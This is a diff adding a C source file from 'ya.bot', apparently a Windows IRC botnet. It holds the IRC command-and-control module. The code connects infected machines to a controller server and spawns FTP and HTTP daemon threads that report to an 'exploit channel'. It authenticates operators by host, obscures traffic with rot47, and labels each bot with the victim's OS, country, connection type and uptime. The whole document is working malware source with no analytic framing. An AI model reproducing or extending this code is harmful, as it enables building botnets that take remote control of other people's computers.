@@ -1,0 +1,379 @@
+/*  ya.bot  */
+
+#include "..\bot.h"
+
+bool irc_action(SOCKET bsock, char *pszAction, char *pszParameter)
+{
+	char szBuffer[IRCBUF];
+
+#ifndef NO_DEBUG
+		debug_print("Sending irc action, irc_action()");
+#endif
+
+	if ((!pszAction) || (!pszParameter))
+			return FALSE;
+		_snprintf(szBuffer, sizeof(szBuffer) - 1,
+				string_ircaction,
+				pszAction,
+				pszParameter,
+				"\r\n");
+	if (send(bsock, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR)
+			return FALSE;
+		return TRUE;
+}
+
+bool irc_connect(int nServer)
+{
+	char szBuffer[MASBUF];
+	int i;
+	sockaddr_in sin;
+	SOCKET bsock;
+	SIRCPing s_ip;	
+	WSAEVENT wsaEvent;
+	WSANETWORKEVENTS wsaNetEvent;
+
+#ifndef NO_DAEMONFTP
+	SDaemonFTP s_df;
+#endif
+
+#ifndef NO_DAEMONHTTP
+	SDaemonHTTP s_dh;
+#endif
+
+#ifndef NO_DEBUG
+		debug_print("Trying to connect to server: %s:%i, irc_connect()",
+				rgSServerList[nServer].m_pszServer,
+				rgSServerList[nServer].m_nPort);
+#endif
+
+	if (!gethostbyname(rgSServerList[nServer].m_pszServer))
+			return FALSE;
+		sin.sin_addr.s_addr = *(LPDWORD)gethostbyname(
+				(char *)rgSServerList[nServer].m_pszServer)->
+				h_addr_list[0];
+		sin.sin_family = AF_INET;
+		sin.sin_port = htons(rgSServerList[nServer].m_nPort);
+		bsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+	if (bsock == INVALID_SOCKET)
+			return FALSE;
+		wsaEvent = WSACreateEvent();
+	if (wsaEvent == WSA_INVALID_EVENT)
+	{
+			irc_disconnect(bsock, wsaEvent);
+			return FALSE;
+	}
+	if (WSAEventSelect(bsock, wsaEvent, FD_CONNECT | FD_CLOSE | FD_READ) == SOCKET_ERROR)
+	{
+			irc_disconnect(bsock, wsaEvent);
+			return FALSE;
+	}
+		connect(bsock, (sockaddr *)&sin, sizeof(sin));
+
+#ifndef NO_DEBUG
+		debug_print("Connection timeout, irc_connect()");
+#endif
+
+		Sleep(rgSServerList[nServer].m_nConnectionTimeOut);
+	if (!irc_setnick(bsock, g_szBotNick, sizeof(g_szBotNick) - 1))
+			return FALSE;
+	if (!irc_userinfo(bsock,
+				(char *)rgSServerList[nServer].m_pszServer,
+				(char *)rgSServerList[nServer].m_pszServerPassword,
+				g_szBotNick))
+	{
+			irc_disconnect(bsock, wsaEvent);
+			return FALSE;
+	}
+		s_ip.m_bsock = bsock;
+		s_ip.m_nServer = nServer;
+		thread_add((char *)string_threadircping, THREAD_IRCPING, irc_ping, &s_ip);
+
+#ifndef NO_DAEMONFTP
+		s_df.m_bsock = bsock;
+		strncpy(s_df.m_szResultChannel,
+				rgSServerList[nServer].m_pszExploitChannel,
+				sizeof(s_df.m_szResultChannel) - 1);
+		s_df.m_bSilent = FALSE;
+		s_df.m_bVerbose = TRUE;
+		thread_add((char *)string_threaddaemonftpmain, THREAD_DAEMONFTP, daemon_ftpmain, &s_df);
+#endif
+
+#ifndef NO_DAEMONHTTP
+		s_dh.m_bsock = bsock;
+		strncpy(s_dh.m_szResultChannel,
+				rgSServerList[nServer].m_pszExploitChannel,
+				sizeof(s_dh.m_szResultChannel) - 1);
+		s_dh.m_bSilent = FALSE;
+		s_dh.m_bVerbose = TRUE;
+		thread_add((char *)string_threaddaemonhttpmain, THREAD_DAEMONHTTP, daemon_httpmain, &s_dh);
+#endif
+
+/*		irc_join(bsock,
+				(char *)rgSServerList[nServer].m_pszBotChannel,
+				(char *)rgSServerList[nServer].m_pszBotChannelKey);*/
+	while (TRUE)
+	{
+		if (WSAWaitForMultipleEvents(1, &wsaEvent, FALSE, WSA_INFINITE, FALSE) == WSA_WAIT_FAILED)
+				break;
+		if (WSAEnumNetworkEvents(bsock, wsaEvent, &wsaNetEvent) == SOCKET_ERROR)
+				break;
+		if (!WSAResetEvent(wsaEvent))
+				break;
+		if (wsaNetEvent.lNetworkEvents & FD_CONNECT)
+		{
+			if (wsaNetEvent.iErrorCode[FD_CONNECT_BIT])
+			{
+
+#ifndef NO_DEBUG
+					debug_print("Connection to %s:%i failed, irc_connect()",
+							rgSServerList[nServer].m_pszServer,
+							rgSServerList[nServer].m_nPort);
+#endif
+
+					break;
+			}
+		}
+		if (wsaNetEvent.lNetworkEvents & FD_READ)
+		{
+				i = recv(bsock, szBuffer, sizeof(szBuffer) - 1, 0);
+				szBuffer[i] = '\0';
+				irc_parsebuffer(bsock, wsaEvent, szBuffer, nServer);
+		}
+		if (wsaNetEvent.lNetworkEvents & FD_CLOSE)
+		{
+
+#ifndef NO_DEBUG
+				debug_print("Connection closed, irc_connect()");
+#endif
+
+				g_bAuthed = FALSE;
+				memset(g_szAuthedHost, 0, sizeof(g_szAuthedHost));
+				break;
+		}
+			SetProcessWorkingSetSize(GetCurrentProcess(), -1, -1); //Uses kernel32.dll
+//			EmptyWorkingSet(GetCurrentProcess()); //Uses psapi.dll
+	}
+
+#ifndef NO_DAEMONFTP
+		thread_killid(THREAD_DAEMONFTP);
+#endif
+
+		thread_killid(THREAD_IRCPING);
+		irc_disconnect(bsock, wsaEvent);
+		return FALSE;
+}
+
+bool irc_disconnect(SOCKET bsock, WSAEVENT wsaEvent)
+{
+
+#ifndef NO_DEBUG
+		debug_print("Disconnecting from irc, irc_disconnect()");
+#endif
+
+	if (shutdown(bsock, SD_BOTH) == SOCKET_ERROR)
+			return FALSE;
+	if (closesocket(bsock) == SOCKET_ERROR)
+			return FALSE;
+		WSACloseEvent(wsaEvent);
+		return TRUE;
+}
+
+bool irc_hostcompare(char *pszSender)
+{
+	int i = 0;
+
+#ifndef NO_DEBUG
+		debug_print("Comparing host, irc_hostcompare()");
+#endif
+
+	while (hostauth[i])
+	{
+		if (wcstrcmp(pszSender, (char *)hostauth[i]))
+				return TRUE;
+			i++;
+	}
+		return FALSE;
+}
+
+bool irc_join(SOCKET bsock, char *pszChannel, char *pszChannelPassword)
+{
+	char szBuffer[IRCBUF];
+
+#ifndef NO_DEBUG
+		debug_print("Joining irc channel, irc_join()");
+#endif
+
+	if ((!pszChannel) || (!pszChannelPassword))
+			return FALSE;
+		_snprintf(szBuffer, sizeof(szBuffer) - 1,
+				string_ircjoin,
+				pszChannel,
+				pszChannelPassword,
+				"\r\n");
+	if (send(bsock, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR)
+			return FALSE;
+		return TRUE;
+}
+
+bool irc_message(SOCKET bsock, char *pszAction, char *pszDestination, char *pszMessage, ...)
+{
+	char szArguments[IRCBUF], szBuffer[IRCBUF];
+	va_list va;
+
+#ifndef NO_DEBUG
+		debug_print("Sending irc message, irc_message()");
+#endif
+
+	if ((!pszAction) || (!pszDestination) || (!pszMessage))
+			return FALSE;
+		_snprintf(szBuffer, sizeof(szBuffer) - 1, string_ircmessage, pszAction, pszDestination);
+		va_start(va, pszMessage);
+		_vsnprintf(szArguments, sizeof(szArguments) - 1, pszMessage, va);
+		va_end(va);
+	if (cryptedcommuncation)
+			crypto_rot47(szArguments);
+		strncat(szBuffer, szArguments, (sizeof(szBuffer) - strlen(szBuffer)) - 1);
+		strncat(szBuffer, "\r\n", (sizeof(szBuffer) - strlen(szBuffer)) - 1);
+	if (send(bsock, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR)
+			return FALSE;
+		return TRUE;
+}
+
+DWORD WINAPI irc_ping(LPVOID param)
+{
+	char szPing[LOWBUF];
+	SIRCPing s_ip = *((SIRCPing *)param);
+
+#ifndef NO_DEBUG
+		debug_print("Ping thread started, irc_ping()");
+#endif
+
+		_snprintf(szPing, sizeof(szPing) - 1,
+				string_ircpingserver,
+				rgSServerList[s_ip.m_nServer].m_pszServer,
+				"\r\n");
+	while (TRUE)
+	{
+			Sleep(rgSServerList[s_ip.m_nServer].m_nPingTimeOut);
+			send(s_ip.m_bsock, szPing, strlen(szPing), 0);
+	}
+		thread_remove(THREAD_IRCPING);
+		return 0;
+}
+
+bool irc_setnick(SOCKET bsock, char *pszBuffer, DWORD dwSize)
+{
+	char szConnection[4], szCountry[16], szNumber[2], szOS[4], szRandom[16];
+	int i, nOS;
+	__int64 i64Uptime;
+	DWORD dwConnection;
+
+#ifndef NO_DEBUG
+		debug_print("Setting botnick, irc_setnick()");
+#endif
+
+	if (!pszBuffer)
+			return FALSE;
+		memset(szRandom, 0, sizeof(szRandom));
+		srand(GetTickCount());
+	for (i = 1; i <= botnickmaxrandom; i++)
+	{
+			memset(szNumber, 0, sizeof(szNumber));
+			_snprintf(szNumber, sizeof(szNumber) - 1, string_ircnicknumber, rand() % 9);
+			strncat(szRandom, szNumber, (sizeof(szRandom) - strlen(szRandom)) - 1);
+	}
+		i64Uptime = getuptime() / 86400;
+	if (botnickextended)
+	{
+/*
+		DIRECT/LAN/MODEM (D/L/M) UPTIME
+		OS
+		COUNTRY
+		random
+		[D00|2K|DEN]374171
+*/
+		if (ip_privateip(ip_getip(bsock)))
+				strncpy(szConnection, string_ircnicklan, sizeof(szConnection) - 1);
+		else
+		{
+				InternetGetConnectedStateEx(&dwConnection, NULL, NULL, 0);
+			if (dwConnection & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM)
+					strncpy(szConnection, string_ircnickmodem, sizeof(szConnection) - 1);
+			else
+					strncpy(szConnection, string_ircnickdirect, sizeof(szConnection) - 1);
+		}
+			nOS = info_os();
+		if (nOS == OS_WINNT)
+				strncpy(szOS, string_ircnicknt, sizeof(szOS) - 1);
+		else if (nOS == OS_WIN2000)
+				strncpy(szOS, string_ircnick2k, sizeof(szOS) - 1);
+		else if (nOS == OS_WINXP)
+				strncpy(szOS, string_infowindowsxp, sizeof(szOS) - 1);
+		else if (nOS == OS_WIN2003)
+				strncpy(szOS, string_ircnick03, sizeof(szOS) - 1);
+		else if (nOS == OS_WINVISTA)
+				strncpy(szOS, string_ircnickvs, sizeof(szOS) - 1);
+		else
+				strncpy(szOS, string_ircnickquestionmarks, sizeof(szOS) - 1);
+		if (!GetLocaleInfo(LOCALE_USER_DEFAULT,  LOCALE_SENGCOUNTRY, szCountry, sizeof(szCountry) - 1))
+				strncpy(szCountry,
+						string_infoquestionmarks,
+						sizeof(szCountry) - 1);
+		else
+		{
+			for (i = 0; i <= 3; i++)
+			{
+				if (islower(szCountry[i]))
+						szCountry[i] = toupper(szCountry[i]);
+			}
+				memcpy(szCountry + 3, "\0", 1);
+		}
+			_snprintf(pszBuffer, dwSize,
+					string_ircnickextended,
+					szConnection,
+					i64Uptime,
+					szOS,
+					szCountry,
+					szRandom);
+	}
+	else
+	{
+		if (info_goodbot(bsock))
+				_snprintf(pszBuffer, dwSize, string_ircnickgood, botnick, szRandom);
+		else
+		{
+			if (i64Uptime >= 14)
+					_snprintf(pszBuffer, dwSize,
+							string_ircnickuptime,
+							i64Uptime,
+							botnick,
+							szRandom);
+			else
+			{
+					strncpy(pszBuffer, botnick, dwSize);
+					strncat(pszBuffer, szRandom, dwSize - strlen(pszBuffer));
+			}
+		}
+	}
+		return TRUE;
+}
+
+bool irc_userinfo(SOCKET bsock, char *pszServer, char *pszServerPassword, char *pszBotNick)
+{
+	char szBuffer[IRCBUF];
+	
+#ifndef NO_DEBUG
+		debug_print("Sending info to ircd, irc_userinfo()");
+#endif
+
+	if ((!pszServer) || (!g_szBotNick))
+			return FALSE;
+		_snprintf(szBuffer, sizeof(szBuffer) - 1,
+				string_ircuserinfo,
+				pszServerPassword, "\r\n",
+				g_szBotNick, "\r\n",
+				g_szBotNick, g_szBotNick, pszServer, g_szBotNick, "\r\n");
+	if (send(bsock, szBuffer, strlen(szBuffer), 0) == SOCKET_ERROR)
+			return FALSE;
+		return TRUE;
+}
